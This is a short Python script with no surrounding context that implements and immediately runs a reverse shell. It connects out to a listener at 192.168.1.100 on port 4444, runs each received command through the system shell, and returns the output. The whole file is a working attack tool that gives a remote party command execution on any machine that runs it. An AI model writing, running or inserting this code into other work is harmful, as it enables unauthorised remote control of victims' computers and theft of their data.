import socket
import subprocess

def reverse_shell(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    while True:
        command = sock.recv(1024).decode()
        if command == "exit":
            break
        output = subprocess.check_output(command, shell=True).decode()
        sock.send(output.encode())

ip = "192.168.1.100"
port = 4444
reverse_shell(ip, port)